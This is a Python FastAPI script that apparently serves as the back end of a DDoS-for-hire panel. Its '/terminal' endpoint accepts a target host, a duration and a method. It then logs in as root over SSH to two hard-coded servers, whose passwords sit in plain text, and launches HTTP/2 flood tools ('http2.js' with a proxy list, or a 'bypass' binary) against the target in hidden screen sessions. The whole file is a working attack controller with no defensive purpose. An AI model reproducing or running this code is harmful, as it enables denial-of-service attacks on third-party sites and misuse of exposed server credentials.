import uvicorn
from fastapi import FastAPI
import paramiko
import string
import random

app = FastAPI()
routers = {1:'65.108.47.105',2:'46.4.81.207'}
router_username = "root"
passwords = {1:'Inverseuwu123$',2:'terminaliscute'}

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def attack(hostx,timex,nodex,methodx):
    router_ip = routers[nodex]
    res = ''.join(random.choices(string.ascii_lowercase +
                             string.digits, k=5))

    try:
        ssh.connect(router_ip, 
            username=router_username, 
            password=passwords[nodex],
            look_for_keys=False )
        if methodx == "https":
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(f"cd powe* && screen -dm -S {res} node http2.js GET {hostx} proxies.txt {timex} 64 90")
        elif methodx == "bypass":
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(f'screen -dm -S {res} "/root/mixednew" {hostx} 90 {timex} 64 --delay true --http2 true')

        output = ssh_stdout.readlines() 
        print(output)
        # ssh.close()
        return False
    except Exception as e:
        print(e)
        return True


@app.get('/terminal')
def execute(host : str,time: str,port : str,method : str,node: int):
    resp = attack(host,time,node,method)
    if resp:
        return {'error':resp,"code":'Couldnt Send Attack'}
    else:
        return {'error':resp,"code":"Sent Request Successfully!"}
uvicorn.run(app,port=1234,host='0.0.0.0')